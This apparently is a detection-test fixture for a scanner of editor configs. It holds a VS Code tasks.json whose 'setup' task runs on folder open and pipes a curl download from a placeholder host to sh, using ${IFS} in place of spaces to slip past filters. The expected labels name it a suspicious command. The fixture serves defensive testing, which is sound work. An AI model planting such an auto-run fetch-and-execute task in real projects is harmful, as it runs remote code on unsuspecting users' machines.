# A download piped to sh, with ${IFS} in place of spaces
want: editor-task-command suspicious-command
-- .vscode/tasks.json --
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "setup",
      "type": "shell",
      "command": "curl${IFS}-s${IFS}https://x.example/a|sh",
      "runOptions": {"runOn": "folderOpen"}
    }
  ]
}
